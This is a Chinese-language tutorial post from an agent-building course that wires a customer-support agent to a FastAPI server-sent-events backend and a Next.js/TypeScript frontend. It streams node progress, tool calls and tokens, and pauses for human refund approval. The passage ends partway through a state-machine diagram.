---
title: 'Day 49 · 界面与流式体验:Next.js 客服工作台、展示工具调用与审批'
description: '用 FastAPI 把工作流包成 HTTP 接口,用 SSE 把每个步骤、每次工具调用、每个字推给前端;再用 Next.js + React + TypeScript 做两个页面:客户视角看着 Agent 干活并追问,客服工作台一键审批退款。讲清楚为什么不用 EventSource、要不要上 Vercel AI SDK、怎么停止、怎么让读屏软件不被逐字播报逼疯。不会前端的同学,文末有 Streamlit 版。'
pubDate: 2026-10-12
regime: none
tags: ['capstone', 'fastapi', 'sse', 'nextjs', 'react', 'typescript', 'streaming', 'ux', 'supportpilot', 'agent-60']
series: 'agent-60'
day: 49
lang: 'zh'
---

## 今天要解决的问题

到目前为止 SupportPilot 只能在终端里跑。面试官不会 clone 你的仓库、配 API key、起数据库来看效果,他们要的是一个打开就能用的页面,或者一段两分钟的演示视频。今天把界面做出来。

重点不是"做个界面",而是**让人看得见 Agent 在干什么**。一张工单处理下来要十几秒,如果页面上只有一个转圈的图标,用户会以为卡死了;如果能看到"查客户档案 ✓ 分诊 ✓ 检索帮助中心 ✓,调用了 list_invoices,正在写回复……",等待就变得可以忍受,而且用户能判断 Agent 有没有走偏。客服和财务更需要看到过程:Agent 查了哪些数据、依据哪条规则,才敢点"通过"。

这一篇默认你会前端。招聘方看 Agent 项目时,界面往往是最先被看到、也最容易拉开差距的部分:后端出身的人大多用 Streamlit 糊一个页面就交差了,你如果能交出一个流式渲染干净、工具调用可读、审批流顺手、能中断能出错的工作台,作品集会好看很多。所以主线用 Next.js + React + TypeScript,Streamlit 版压缩后放在文末备选。

今天结束时你应该做到:

1. 一组 HTTP 接口:建工单、跑工单、追问、查状态、列待审批、审批。跑工单、追问和审批是 SSE 流式接口,推送节点完成、步骤细节、工具调用、逐字输出、审批暂停、完成六类事件。
2. 一个 Next.js 前端:客户视角(提交工单、看过程、追问)和客服工作台(待审批列表、一键通过或驳回、看恢复后的流程跑完)。
3. 前端把事件流收进一个 reducer,组件只负责渲染;支持停止接收,错误和空状态都有像样的提示。
4. 修掉一个并发下成本统计出错的 bug。
5. 后端用 FastAPI 测试客户端加假 LLM 测通"跑到审批 → 审批 → 完成";前端用一个假 SSE 服务端在浏览器里把整套交互走一遍。

预计用时 5–6 小时。前置:Day 4(流式输出)、Day 36(FastAPI + SSE)、Day 47–48。

## 先修一个 bug:并发时成本算错

Day 47 的节点这样算成本:开始前读一下 LLMClient 账本的累计值,结束后再读一次,差值就是这个节点花的钱。在终端里一张一张跑没问题。

放到 Web 服务里,所有请求共用一个 `Deps`,也就共用同一个 `LLMClient` 和它的账本。两张工单同时在跑,工单 A 的 draft 节点开始时账本是 0.010,结束时是 0.016,但这中间工单 B 的 classify 节点也往账本里记了 0.002。A 的 draft 就被算成花了 0.006,实际只花了 0.004。

这种 bug 不会报错,不会崩,只是数字悄悄不对。等你在 Day 52 的成本看板上看到"draft 节点平均成本比上周涨了 30%",会花一下午去查提示词是不是变长了。

修法是每个请求用一份新的 LLM 客户端,各记各的账。检索器(内存里有 BM25 索引)和数据库连接这些重的东西照样共用:

```python
    def fresh(self) -> "Deps":
        """每个请求用一份新的 LLM 客户端(各自的成本账本),检索器和数据库这些重的东西共用。
        不这么做的话,两个工单并发时 spent() 的差值会把别人的花费算进来。"""
        llm = LLMClient(self.settings, model=self.llm.model)
        small = llm if self.small_llm is self.llm else LLMClient(self.settings, model=self.small_llm.model)
        return replace(self, llm=llm, small_llm=small)
```

`dataclasses.replace` 复制一个 dataclass 并替换指定字段,其余字段共享同一个对象。创建 `LLMClient` 只是创建一个 openai SDK 客户端对象,很便宜。

我写 Day 47 时没想到这个问题,是写今天的接口时想到"多个请求同时跑会怎样"才发现的。做服务化时,把每个"全局共享"的对象都过一遍"并发时会不会串",这个习惯很值钱。

## 接口设计

```python
# supportpilot/src/supportpilot/api/app.py
"""HTTP 接口。启动:uv run uvicorn supportpilot.api.app:app --reload --port 8000

  POST /tickets                    建工单,返回 ticket_id
  POST /tickets/{id}/run           跑工作流,SSE 推送过程(第一轮)
  POST /tickets/{id}/messages      客户追问,SSE 推送过程(后续轮)
  GET  /tickets/{id}               当前状态
  GET  /approvals                  待审批的退款
  POST /approvals/{ticket_id}      审批,SSE 推送恢复后的过程
"""

import json
import os
from contextlib import asynccontextmanager

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from langgraph.types import Command
from pydantic import BaseModel, Field
from sse_starlette import EventSourceResponse
from starlette.concurrency import iterate_in_threadpool

from ..agent.deps import Deps
from ..agent.graph import build_graph
from ..db import connect
from ..memory.checkpoint import make_checkpointer
from ..tools import business as biz

R: dict = {}  # 进程级资源:数据库连接、checkpointer、基础 deps


@asynccontextmanager
async def lifespan(app: FastAPI):
    R["conn"] = connect()
    R["saver"] = make_checkpointer()
    R["deps"] = Deps.from_conn(R["conn"])
    yield
    R["conn"].close()


app = FastAPI(title="SupportPilot", lifespan=lifespan)
# Next.js 前端跑在 3000 端口,和 API 不同源,浏览器会先发 OPTIONS 预检。只放行自己的前端地址,别写 "*"
app.add_middleware(
    CORSMiddleware,
    allow_origins=os.getenv("SUPPORTPILOT_WEB_ORIGINS", "http://localhost:3000").split(","),
    allow_methods=["GET", "POST"],
    allow_headers=["content-type", "accept"],
)


class NewTicket(BaseModel):
    customer_email: str
    subject: str = Field(max_length=200)
    body: str = Field(max_length=4000)


class Message(BaseModel):
    content: str = Field(max_length=4000)


class Decision(BaseModel):
    approved: bool
    approver: str
    note: str = ""


def _graph():
    return build_graph(R["deps"].fresh(), checkpointer=R["saver"])


def _cfg(ticket_id: str) -> dict:
    return {"configurable": {"thread_id": ticket_id}}


def _events(graph, payload, ticket_id: str):
    """把 LangGraph 的流翻译成前端好消费的 SSE 事件。这是个同步生成器,外面用线程池包一层。"""
    for mode, chunk in graph.stream(payload, _cfg(ticket_id), stream_mode=["updates", "custom"]):
        if mode == "custom":
            yield {"event": chunk["type"], "data": json.dumps(chunk, ensure_ascii=False)}
            continue
        for node, update in chunk.items():
            if node == "__interrupt__":
                yield {"event": "interrupt", "data": json.dumps(update[0].value, ensure_ascii=False, default=str)}
            else:
                yield {"event": "node", "data": json.dumps({"node": node}, ensure_ascii=False)}
    yield {"event": "done", "data": json.dumps(_summary(graph, ticket_id), ensure_ascii=False, default=str)}


def _summary(graph, ticket_id: str) -> dict:
    snap = graph.get_state(_cfg(ticket_id))
    v = snap.values
    return {"ticket_id": ticket_id, "outcome": v.get("outcome") or ("waiting_approval" if snap.next else None),
            "category": v.get("triage", {}).get("category"), "reply": v.get("reply"),
            "tool_log": v.get("tool_log", []), "cost_cny": round(v.get("cost_cny", 0.0), 5),
            "waiting_on": list(snap.next)}


def _sse(gen) -> EventSourceResponse:
    return EventSourceResponse(iterate_in_threadpool(gen))


@app.post("/tickets")
def create_ticket(t: NewTicket) -> dict:
    return {"ticket_id": biz.create_ticket(R["conn"], t.customer_email, t.subject, t.body)}


@app.post("/tickets/{ticket_id}/run")
def run_ticket(ticket_id: str):
    row = R["conn"].execute("SELECT id, customer_email, subject, body FROM biz.tickets WHERE id = %s",
                            (ticket_id,)).fetchone()
    if not row:
        raise HTTPException(404, "ticket not found")
    return _sse(_events(_graph(), {"ticket": dict(row)}, ticket_id))


@app.post("/tickets/{ticket_id}/messages")
def follow_up(ticket_id: str, m: Message):
    graph = _graph()
    snap = graph.get_state(_cfg(ticket_id))
    if not snap.values:
        raise HTTPException(404, "ticket has not been run yet")
    if snap.next:
        raise HTTPException(409, "工单还在等待审批,审批完成后才能继续对话")
    return _sse(_events(graph, {"turns": [{"role": "customer", "content": m.content}]}, ticket_id))


@app.get("/tickets/{ticket_id}")
def get_ticket(ticket_id: str) -> dict:
    return _summary(_graph(), ticket_id)


@app.get("/approvals")
def list_approvals() -> list[dict]:
    rows = R["conn"].execute(
        "SELECT r.*, t.subject, c.name AS customer_name FROM biz.refund_requests r "
        "JOIN biz.customers c ON c.id = r.customer_id LEFT JOIN biz.tickets t ON t.id = r.ticket_id "
        "WHERE r.status = 'pending' ORDER BY r.created_at").fetchall()
    return [biz._jsonable(r) | {"created_at": str(r["created_at"])} for r in rows]


@app.post("/approvals/{ticket_id}")
def decide(ticket_id: str, d: Decision):
    graph = _graph()
    if "approval" not in graph.get_state(_cfg(ticket_id)).next:
        raise HTTPException(409, "这个工单不在等待审批")
    return _sse(_events(graph, Command(resume=d.model_dump()), ticket_id))
```

六个接口,对应工单的生命周期:

| 方法 | 路径 | 作用 | 返回 |
| --- | --- | --- | --- |
| POST | `/tickets` | 建工单(写进 biz.tickets) | `{"ticket_id"}` |
| POST | `/tickets/{id}/run` | 第一次处理这张工单 | SSE 流 |
| POST | `/tickets/{id}/messages` | 客户追问 | SSE 流 |
| GET | `/tickets/{id}` | 当前状态(结果、工具记录、成本、是否在等审批) | JSON |
| GET | `/approvals` | 所有待审批的退款 | JSON 列表 |
| POST | `/approvals/{ticket_id}` | 审批,恢复工作流 | SSE 流 |

几个设计决定:

**建工单和跑工单分开。** 一个接口干两件事也可以,但分开后,建工单可以来自任何渠道(网页表单、邮件网关、企业微信),跑工单可以是同步触发也可以是后台队列触发(Day 37 讲过)。另外前端拿到 ticket_id 之后再连 SSE,断线重连时知道自己在跑哪张工单。

**追问前检查状态。** 如果工单还停在审批节点(`snap.next` 不为空),这时追问会和审批冲突,返回 409。返回 409 而不是默默排队,是让前端明确告诉用户"等审批完再说"。

**审批接口也是流式的。** 审批后工作流要从 approval 节点接着跑 finalize,前端需要看到最终回复和补充说明。

**每个请求现编译一张图。** `_graph()` 每次都 `build_graph(deps.fresh(), ...)`。编译一张九个节点的图是毫秒级的事,换来每个请求有自己的 LLM 账本。checkpointer 是共用的,因为它就是靠 thread_id 区分工单的。

### 同步的图,异步的服务

FastAPI 是异步框架,我们的图是同步的(`graph.stream` 是普通生成器,里面的 openai 调用是阻塞的)。如果直接在 async 函数里跑同步生成器,一张工单处理的十几秒里,整个服务的事件循环都被卡住,别的请求全部排队。

`iterate_in_threadpool` 把同步生成器放到线程池里跑,每取一个元素就在线程池里执行一步,事件循环不会被阻塞。接口函数本身写成普通的 `def`(不是 `async def`),FastAPI 也会把它放进线程池。

另一种做法是把整条链路改成异步:`LLMClient` 用 `AsyncOpenAI`,节点写成 `async def`,用 `graph.astream`。性能更好,但要改的地方多,psycopg 也要换成异步连接。对一个演示项目,线程池足够了。面试时被问到,能说清楚这个取舍就行。

有一处要说明:所有请求共用一条 psycopg 连接。psycopg 3 的连接可以跨线程使用,但同一时刻只能执行一条语句,并发高了会排队。演示项目单进程、并发很低,没问题。Day 53 部署时会换成连接池。

## SSE 事件协议

前端和后端之间约定了六种事件:

| event | data 里有什么 | 前端怎么用 |
| --- | --- | --- |
| `node` | `{"node": "classify"}` | 某个节点跑完了,进度条打一个勾 |
| `step` | 节点自己推的信息,比如分类结果、检索到的文章、质检结论 | 显示细节;质检不通过时提示正在重写 |
| `tool` | 工具名、参数、是否出错 | 显示一张工具调用卡片 |
| `token` | 一小段文字 | 打字机效果 |
| `interrupt` | 退款申请详情 | 提示"已提交审批" |
| `done` | 最终状态摘要 | 显示最终回复和成本 |

`node` 来自 LangGraph 的 `updates` 流模式(每个节点执行完的状态更新),`step`、`tool`、`token` 来自 `custom` 流模式(节点里用 `get_stream_writer` 主动推送的)。一次 `graph.stream(..., stream_mode=["updates", "custom"])` 两种都拿到,每个元素是 `(模式, 数据)` 的二元组。

`updates` 里如果出现 `__interrupt__` 这个键,说明图停在了 interrupt 处,我们把它翻译成 `interrupt` 事件。流结束后再查一次完整状态,推一个 `done` 事件。

SSE 格式本身很简单,每条消息是 `event: 名字` 和 `data: 内容` 两行,后面跟一个空行。sse-starlette 帮我们处理格式、心跳和断线检测。

<figure>
<svg viewBox="0 0 640 300" role="img" aria-label="一次工单处理的 SSE 事件流">
<g font-family="var(--font-mono)" font-size="11">
<text x="80" y="22" text-anchor="middle" fill="var(--ink)">浏览器</text>
<text x="320" y="22" text-anchor="middle" fill="var(--ink)">FastAPI</text>
<text x="540" y="22" text-anchor="middle" fill="var(--mem)">LangGraph(线程池)</text>
</g>
<g stroke="var(--rule)" stroke-dasharray="3 3"><line x1="80" y1="30" x2="80" y2="290"/><line x1="320" y1="30" x2="320" y2="290"/><line x1="540" y1="30" x2="540" y2="290"/></g>
<g font-family="var(--font-mono)" font-size="10.5" fill="var(--ink-soft)">
<line x1="80" y1="50" x2="316" y2="50" stroke="var(--ink-faint)"/><text x="200" y="45" text-anchor="middle">POST /tickets/T1/run</text>
<line x1="320" y1="65" x2="536" y2="65" stroke="var(--ink-faint)"/><text x="430" y="60" text-anchor="middle">graph.stream(updates+custom)</text>
<line x1="540" y1="90" x2="84" y2="90" stroke="var(--mem)" stroke-dasharray="4 2"/><text x="310" y="85" text-anchor="middle">event: node / step(classify)</text>
<line x1="540" y1="115" x2="84" y2="115" stroke="var(--compute)" stroke-dasharray="4 2"/><text x="310" y="110" text-anchor="middle">event: tool(list_invoices)</text>
<line x1="540" y1="140" x2="84" y2="140" stroke="var(--compute)" stroke-dasharray="4 2"/><text x="310" y="135" text-anchor="middle">event: tool(create_refund_request)</text>
<line x1="540" y1="165" x2="84" y2="165" stroke="var(--mem)" stroke-dasharray="4 2"/><text x="310" y="160" text-anchor="middle">event: token × N(打字机)</text>
<line x1="540" y1="190" x2="84" y2="190" stroke="var(--ink-faint)" stroke-dasharray="4 2"/><text x="310" y="185" text-anchor="middle">event: interrupt(等审批)</text>
<line x1="320" y1="215" x2="84" y2="215" stroke="var(--ink-faint)" stroke-dasharray="4 2"/><text x="200" y="210" text-anchor="middle">event: done</text>
<line x1="80" y1="250" x2="316" y2="250" stroke="var(--ink-faint)"/><text x="200" y="245" text-anchor="middle">POST /approvals/T1 {approved}</text>
<line x1="320" y1="270" x2="536" y2="270" stroke="var(--ink-faint)"/><text x="430" y="265" text-anchor="middle">Command(resume) → finalize</text>
</g>
</svg>
<figcaption>一张退款工单的事件流。第一次请求在 interrupt 处结束;审批是另一次请求,用同一个 thread_id 恢复,继续推送事件直到 done。</figcaption>
</figure>

## 前端选型:Vercel AI SDK,还是自己读流

做 AI 聊天界面,React 圈子里最顺手的工具是 Vercel 的 AI SDK。2026 年 10 月我查的时候,`ai` 包是 7.0.x,React 绑定在 `@ai-sdk/react` 4.0.x,核心是 `useChat` 这个 hook:消息列表、流式更新、工具调用、甚至工具审批(协议里有 `tool-approval-request` 这种事件)都帮你管好了。它也支持 Python 后端,官方仓库里有一个 `examples/next-fastapi` 示例。

听起来该直接用。我最后没用,原因有三条,你可以对照自己的情况判断。

**它要求后端说它的协议。** `useChat` 消费的是 AI SDK 自己的 UI Message Stream 协议:后端响应头要带 `x-vercel-ai-ui-message-stream: v1`,事件是 `text-delta`、`tool-input-available`、`data-*` 这些固定类型。我们 Day 47 起后端推的是自己定义的 node/step/tool/token/interrupt/done。要用 `useChat`,就得在 Python 这边再写一层翻译,把 LangGraph 的流改写成它的格式。这层翻译并不难,但它让前端的方便建立在后端迁就前端之上。

**我们的交互不完全是"聊天"。** `useChat` 的模型是同一个用户和 Agent 你来我往,消息列表由前端持有。SupportPilot 的审批是另一个人(客服)在另一个页面做的,恢复后的流程推给的是客服的页面,客户那边要刷新状态才知道结果。硬塞进 `useChat` 的消息模型,要绕不少弯。

**课程的目的。** 自己读流只要四十行,读完你会知道一个 SSE 流在浏览器里到底经过了哪些步骤:fetch 拿到字节流、解码成文本、按空行切事件、解析 JSON、进 reducer。面试被问"流式输出前端怎么做",你能讲到字节层面,而不是"用了个 hook"。

所以今天的选择是:原生 `fetch` 读响应体,用 `eventsource-parser`(4.1.x)切事件,自己写一个 `useReducer` 管状态。如果你以后起一个全新的 TypeScript 项目,后端也是 Node,那 AI SDK 是更好的选择,能省很多代码。课后有一道练习让你把后端改成说 AI SDK 的协议,两种做法都摸一遍。

### 为什么不能用 EventSource

浏览器自带 `EventSource`,专门读 SSE,还会自动重连。问题是它只能发 GET,不能带请求体,也不能加自定义请求头。我们的三个流式接口都是 POST:追问要带客户说的话,审批要带决定和备注。

有人会把接口改成 GET,把内容塞进 URL 参数。别这么做:审批是有副作用的操作,GET 会被预取、被缓存、被日志完整记下来,还可能被重放。保持 POST,前端换成 `fetch` 读流就行。代价是自动重连没了,要自己处理,下面"停止和断线"一节会说。

<figure class="video">
<div class="video-frame"><iframe src="https://player.bilibili.com/player.html?bvid=BV1ws4y1P7G7&autoplay=0&high_quality=1" title="chatgpt stream 实时输出功能实现原理 SSE(Server-send events)" loading="lazy" scrolling="no" allowfullscreen></iframe></div>
<figcaption>今晚吃泡面a · chatgpt stream 实时输出功能实现原理 SSE · 7 分钟,讲 SSE 的格式和 nginx 代理时要关缓冲。视频用的是 EventSource,正好对照一下我们为什么改用 fetch。</figcaption>
</figure>

## 项目结构

前端放在 SupportPilot 仓库的 `web/` 目录,和 Python 包平级。用 `create-next-app` 生成:

```bash
cd supportpilot
npx create-next-app@16.4.0 web --ts --app --no-eslint --no-tailwind --src-dir --import-alias "@/*" --use-npm --yes
cd web && npm i eventsource-parser@4.1.1
rm src/app/page.module.css
```

我本机生成出来的是 Next.js 16.4.0、React 19.3.0、TypeScript 5.x,构建器默认是 Turbopack。版本号写死是故意的:前端生态半年一个大版本,教程不锁版本,三个月后读者照着敲就对不上了。脚手架自带的 `layout.tsx` 用了 `next/font/google`,构建时要从 Google 拉字体,国内网络经常卡死,我们的 layout 里直接去掉了。

```
web/
├── .env.local                 # NEXT_PUBLIC_SUPPORTPILOT_API=http://localhost:8000
├── scripts/fake_api.py        # 假后端,不花钱调界面用
└── src/
    ├── app/
    │   ├── layout.tsx         # 顶部导航
    │   ├── page.tsx           # 客户视角
    │   ├── desk/page.tsx      # 客服工作台
    │   └── globals.css
    ├── components/
    │   ├── RunView.tsx        # 一次运行:状态、步骤、工具卡片、草稿/回复
    │   ├── ToolCard.tsx
    │   └── Reply.tsx          # 回复正文 + 引用
    └── lib/
        ├── events.ts          # 事件类型,和后端 _events() 一一对应
        ├── sse.ts             # fetch + eventsource-parser
        ├── api.ts             # 六个接口的类型化封装
        ├── useRun.ts          # reducer + hook
        └── reply.ts           # 解析 render_sources() 的输出
```

分层的思路是:`lib/` 不碰 DOM,只管协议和状态,可以单独测;`components/` 只拿状态渲染,不知道数据从哪来;`app/` 的页面把两者接起来。事件协议变了,只改 `events.ts`,TypeScript 会把所有需要跟着改的地方标红。

## 事件类型和读流

先把协议写成类型。下面每个分支都对应后端 `_events()` 里的一种 `event:`,`data` 的形状对应 Day 47 节点里 `_emit()` 推出来的字典:

```ts
// supportpilot/web/src/lib/events.ts
// 和后端 api/app.py 的 _events() 一一对应。改后端事件就先改这里,让 TypeScript 帮你找漏掉的地方。

export type ToolEvent = { type: "tool"; name: string; args: Record<string, unknown>; error: string | null };

export type StepEvent =
  | { type: "step"; node: "load_customer"; found: boolean }
  | { type: "step"; node: "classify"; category: string }
  | { type: "step"; node: "retrieve"; docs: string[] }
  | { type: "step"; node: "check"; passed: boolean; problems: string[] }
  | { type: "step"; node: string; [k: string]: unknown };

export type RefundRequest = { id: string; amount_cny: number; rule: string; reason?: string };

export type Summary = {
  ticket_id: string;
  outcome: "resolved" | "escalated" | "waiting_approval" | null;
  category: string | null;
  reply: string | null;
  tool_log: unknown[];
  cost_cny: number;
  waiting_on: string[];
};

export type AgentEvent =
  | { event: "node"; data: { node: string } }
  | { event: "step"; data: StepEvent }
  | { event: "tool"; data: ToolEvent }
  | { event: "token"; data: { type: "token"; text: string } }
  | {
      event: "interrupt";
      data: { type: "refund_approval"; ticket_id: string; request: RefundRequest; needs_finance_review: boolean };
    }
  | { event: "done"; data: Summary }
  // Day 49 练习 7 加的:后端出错时推一个 error 事件,而不是让连接断掉
  | { event: "error"; data: { message: string } };

export const STEP_NAMES: Record<string, string> = {
  load_customer: "查客户档案",
  prepare_context: "整理上下文",
  classify: "分诊",
  retrieve: "检索帮助中心",
  act: "查业务数据",
  draft: "起草回复",
  check: "质检",
  approval: "等待审批",
  finalize: "定稿",
  handoff: "转人工",
};
```

`AgentEvent` 是一个按 `event` 字段区分的联合类型。reducer 里 `switch (e.event)` 之后,TypeScript 知道每个分支里 `e.data` 长什么样,写错字段名会直接编译失败。`step` 那一组最后留了一个宽松的兜底分支,因为节点以后可能会推新的细节,前端不认识就忽略,别因为后端多推了一个字段就崩。

`error` 事件后端现在还没有,是动手练习第 7 步要加的。类型先写上,前端先处理,后端补上之后就能直接用。

然后是读流:

```ts
// supportpilot/web/src/lib/sse.ts
// 我们的流式接口都是 POST,浏览器自带的 EventSource 只能发 GET,所以用 fetch 读响应体,
// 交给 eventsource-parser 切成一条条事件。
import { EventSourceParserStream } from "eventsource-parser/stream";
import type { AgentEvent } from "./events";

export class ApiError extends Error {
  constructor(
    public status: number,
    message: string,
  ) {
    super(message);
  }
}

export async function* streamEvents(
  url: string,
  init: { method?: string; body?: unknown; signal?: AbortSignal } = {},
): AsyncGenerator<AgentEvent> {
  const res = await fetch(url, {
    method: init.method ?? "POST",
    headers: { "content-type": "application/json", accept: "text/event-stream" },
    body: init.body === undefined ? undefined : JSON.stringify(init.body),
    signal: init.signal,
  });
  if (!res.ok || !res.body) {
    // FastAPI 的 HTTPException 返回 {"detail": "..."},409 的中文提示直接给用户看
    const detail = await res.json().then((j) => j.detail, () => res.statusText);
    throw new ApiError(res.status, typeof detail === "string" ? detail : JSON.stringify(detail));
  }
  // TS 默认的 DOM 类型里 ReadableStream 还不能 for await,用 reader 手动读,哪个浏览器都没问题
  const reader = res.body.pipeThrough(new TextDecoderStream()).pipeThrough(new EventSourceParserStream()).getReader();
  try {
    for (;;) {
      const { done, value: msg } = await reader.read();
      if (done) return;
      if (!msg.event) continue; // sse-starlette 的心跳是注释行,解析器已经丢掉了,这里防一手空事件
      yield { event: msg.event, data: JSON.parse(msg.data) } as AgentEvent;
    }
  } finally {
    reader.releaseLock();
  }
}
```

这几十行里有几个细节值得说。

**`TextDecoderStream` 不能省。** 网络分片是按字节切的,一个汉字三个字节,完全可能被切在两个包里。自己 `new TextDecoder().decode(chunk)` 逐块解码的话,切断的汉字会变成乱码。`TextDecoderStream` 内部会把半个字符留到下一块再拼,这个坑我们不用自己踩。

**事件的切分交给 `eventsource-parser`。** SSE 的规则不复杂:按空行分隔事件,`event:` 行是名字,`data:` 行是内容,可以有多行 `data:`,以冒号开头的是注释。但自己写的话,"一个事件被切在两个网络包里"这种情况很容易漏。sse-starlette 默认每 15 秒发一条注释当心跳,防止代理把空闲连接掐掉,解析器会把注释吞掉,我们拿到的只有真事件。

**出错时把后端的 `detail` 带出来。** FastAPI 的 `HTTPException(409, "工单还在等待审批……")` 返回 `{"detail": "..."}`。这句话是写给用户看的,前端原样显示,比"请求失败"有用得多。

**为什么用 reader 而不是 `for await`。** `ReadableStream` 在新浏览器里可以直接 `for await` 遍历,但 TypeScript 默认的 DOM 类型声明还没跟上,`next build` 的类型检查会报 `TS2504`。我第一次就是这么写的,构建失败,改成 `getReader()` 手动读,任何环境都没问题。

接口封装就是把六个接口写成六个函数:

```ts
// supportpilot/web/src/lib/api.ts
import { ApiError, streamEvents } from "./sse";
import type { RefundRequest, Summary } from "./events";

export const API = process.env.NEXT_PUBLIC_SUPPORTPILOT_API ?? "http://localhost:8000";

async function json<T>(path: string, init?: RequestInit): Promise<T> {
  const res = await fetch(API + path, { ...init, headers: { "content-type": "application/json", ...init?.headers } });
  if (!res.ok) {
    const detail = await res.json().then((j) => j.detail, () => res.statusText);
    throw new ApiError(res.status, String(detail));
  }
  return res.json() as Promise<T>;
}

export type PendingRefund = RefundRequest & {
  ticket_id: string;
  customer_name: string;
  subject: string | null;
  created_at: string;
};

export const createTicket = (t: { customer_email: string; subject: string; body: string }) =>
  json<{ ticket_id: string }>("/tickets", { method: "POST", body: JSON.stringify(t) });

export const getTicket = (id: string) => json<Summary>(`/tickets/${id}`);

export const listApprovals = () => json<PendingRefund[]>("/approvals");

export const runTicket = (id: string, signal: AbortSignal) => streamEvents(`${API}/tickets/${id}/run`, { signal });

export const followUp = (id: string, content: string, signal: AbortSignal) =>
  streamEvents(`${API}/tickets/${id}/messages`, { body: { content }, signal });

export const decide = (
  ticketId: string,
  d: { approved: boolean; approver: string; note: string },
  signal: AbortSignal,
) => streamEvents(`${API}/approvals/${ticketId}`, { body: d, signal });
```

API 地址从 `NEXT_PUBLIC_SUPPORTPILOT_API` 读。Next.js 只会把 `NEXT_PUBLIC_` 开头的环境变量打进浏览器端的代码,而且是在**构建时**替换成字面量,不是运行时读。所以部署时换 API 地址要重新 build,这个和后端读环境变量的习惯不一样,第一次部署经常栽在这。

前后端不同源(3000 和 8000),浏览器会先发 OPTIONS 预检请求。接口设计那一节给 FastAPI 加的 `CORSMiddleware` 就是为这个。另一种做法是用 Next.js 的 rewrites 把 `/api/*` 代理到后端,同源就没有跨域问题,但开发服务器转发 SSE 时可能缓冲,我没用这条路。

## 状态:一次运行就是一个 reducer

一次运行(第一次跑、一次追问、一次审批恢复)会收到几十到几百个事件。用一堆 `useState` 各管一块很快就乱,这里用 `useReducer`:事件进 reducer,算出新状态,组件只读状态。

```ts
// supportpilot/web/src/lib/useRun.ts
// 一次运行(run / 追问 / 审批恢复)的全部界面状态。事件流进 reducer,组件只管渲染。
"use client";
import { useCallback, useReducer, useRef } from "react";
import type { AgentEvent, RefundRequest, Summary, ToolEvent } from "./events";
import { ApiError } from "./sse";

export type RunStatus = "idle" | "running" | "waiting_approval" | "done" | "error" | "stopped";

export type RunState = {
  status: RunStatus;
  steps: string[]; // 跑完的节点,按顺序
  details: Record<string, string>; // 节点内部推的细节,按节点名挂上去
  tools: ToolEvent[];
  draft: string; // 打字机里的草稿
  rewrites: number; // 质检退回了几次
  approval: { request: RefundRequest; needsFinanceReview: boolean } | null;
  summary: Summary | null;
  error: string | null;
};

const initial: RunState = {
  status: "idle",
  steps: [],
  details: {},
  tools: [],
  draft: "",
  rewrites: 0,
  approval: null,
  summary: null,
  error: null,
};

type Action =
  | { type: "start" }
  | { type: "event"; e: AgentEvent }
  | { type: "fail"; message: string }
  | { type: "stopped" };

function stepDetail(e: Extract<AgentEvent, { event: "step" }>["data"]): string | undefined {
  if (e.node === "classify" && "category" in e) return `分类:${String(e.category)}`;
  if (e.node === "retrieve" && "docs" in e && Array.isArray(e.docs)) return `命中 ${e.docs.length} 篇:${e.docs.join("、")}`;
  if (e.node === "load_customer" && "found" in e) return e.found ? "找到客户" : "没找到这个邮箱对应的客户";
  return undefined;
}

export function reducer(s: RunState, a: Action): RunState {
  switch (a.type) {
    case "start":
      return { ...initial, status: "running" };
    case "fail":
      return { ...s, status: "error", error: a.message };
    case "stopped":
      return s.status === "running" ? { ...s, status: "stopped" } : s;
    case "event": {
      const e = a.e;
      switch (e.event) {
        case "node":
          return { ...s, steps: [...s.steps, e.data.node] };
        case "step": {
          // 质检没过:draft 节点会从头重写,旧草稿必须清掉,否则两版文字会接在一起
          if (e.data.node === "check" && "passed" in e.data && e.data.passed === false) {
            return { ...s, draft: "", rewrites: s.rewrites + 1 };
          }
          // step 在节点内部推,比 node(节点跑完)早到。细节单独存,渲染时按节点名对上,不要再插一行
          const detail = stepDetail(e.data);
          return detail ? { ...s, details: { ...s.details, [e.data.node]: detail } } : s;
        }
        case "tool":
          return { ...s, tools: [...s.tools, e.data] };
        case "token":
          return { ...s, draft: s.draft + e.data.text };
        case "interrupt":
          return { ...s, approval: { request: e.data.request, needsFinanceReview: e.data.needs_finance_review } };
        case "error":
          return { ...s, status: "error", error: e.data.message };
        case "done":
          return {
            ...s,
            summary: e.data,
            status: e.data.outcome === "waiting_approval" ? "waiting_approval" : "done",
          };
      }
    }
  }
}

export function useRun() {
  const [state, dispatch] = useReducer(reducer, initial);
  const ctrl = useRef<AbortController | null>(null);

  const start = useCallback(async (open: (signal: AbortSignal) => AsyncGenerator<AgentEvent>) => {
    ctrl.current?.abort();
    const c = new AbortController();
    ctrl.current = c;
    dispatch({ type: "start" });
    try {
      for await (const e of open(c.signal)) dispatch({ type: "event", e });
    } catch (err) {
      if (c.signal.aborted) dispatch({ type: "stopped" });
      else dispatch({ type: "fail", message: err instanceof ApiError ? err.message : "连接中断,请稍后重试" });
    }
  }, []);

  const stop = useCallback(() => ctrl.current?.abort(), []);

  // 不走流,直接塞一个事件进来。用于审批完成后刷新最终状态(GET /tickets/{id} 返回的就是 done 的格式)
  const apply = useCallback((e: AgentEvent) => dispatch({ type: "event", e }), []);

  return { state, start, stop, apply };
}
```

<figure>
<svg viewBox="0 0 640 220" role="img" aria-label="一次运行的状态机">
<g font-family="var(--font-mono)" font-size="12">
<rect x="20" y="90" width="80" height="36" rx="6" fill="var(--paper-raised)" stroke="var(--rule)"/><text x="60" y="113" text-anchor="middle" fill="var(--ink)">idle</text>
<rect x="160" y="90" width="100" height="36" rx="6" fill="var(--mem-wash)" stroke="var(--mem)"/><text x="210" y="113" text-anchor="middle" fill="var(--ink)">running</text>
<rect x="340" y="20" width="150" height="36" rx="6" fill="var(--compute-wash)" stroke="var(--compute)"/><text x="415" y="43" text-anchor="middle" fill="var(--ink)">waiting_approval</text>
<rect x="340" y="90" width="150" height="36" rx="6" fill="var(--paper-raised)" stroke="var(--rule)"/><text x="415" y="113" text-anchor="middle" fill="var(--ink)">done</text>
<rect x="340" y="160" width="70" height="36" rx="6" fill="var(--paper-raised)" stroke="var(--rule)"/><text x="375" y="183" text-anchor="middle" fill="var(--ink)">error</text>
<rect x="420" y="160" width="70" height="36" rx="6" fill="var(--paper-raised)" stroke="var(--rule)"/><text x="455" y="183" text-anchor="middle" fill="var(--ink)">stopped</text>
</g>
<g stroke="var(--ink-faint)" fill="none" stroke-width="1.2">
